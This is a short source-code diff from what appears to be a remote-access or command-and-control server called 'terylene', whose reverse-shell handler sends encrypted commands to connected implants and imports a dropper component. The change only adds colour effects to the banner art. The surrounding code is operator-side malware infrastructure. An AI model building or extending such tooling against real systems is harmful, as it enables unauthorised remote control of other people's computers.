@@ -15,6 +15,7 @@ import (
 	config "terylene/config"
 	zcrypto "terylene/crypto"
 	dropper "terylene/server/components/dropper"
+	"terylene/server/components/fade"
 	"terylene/server/components/setup"
 	"terylene/server/components/transfer"
 	poly "terylene/server/theme/default"
@@ -338,11 +339,11 @@ func reversehandler(connID string, scanner *bufio.Scanner, router *zmq.Socket) {
 	}
 
 	if polykey == "" {
-		fmt.Print(poly.Shellart3)
+		fmt.Print(fade.Amber(poly.Shellart3))
 		fmt.Printf("\nNo such terylene connID: %s\n", connID)
 		return
 	} else {
-		fmt.Print(poly.Shellart)
+		fmt.Print(fade.Water(poly.Shellart))
 	}
 	for {
 		scanner.Scan()
@@ -363,7 +364,7 @@ func reversehandler(connID string, scanner *bufio.Scanner, router *zmq.Socket) {
 		if command == "exit" || command == "background" {
 			clearScreen()
 			shell = false
-			fmt.Print(poly.Shellart2)
+			fmt.Print(fade.Water(poly.Shellart2))
 			break
 		}
 		encommand, err := zcrypto.EncryptChaCha20Poly1305([]byte(command), []byte(polykey))
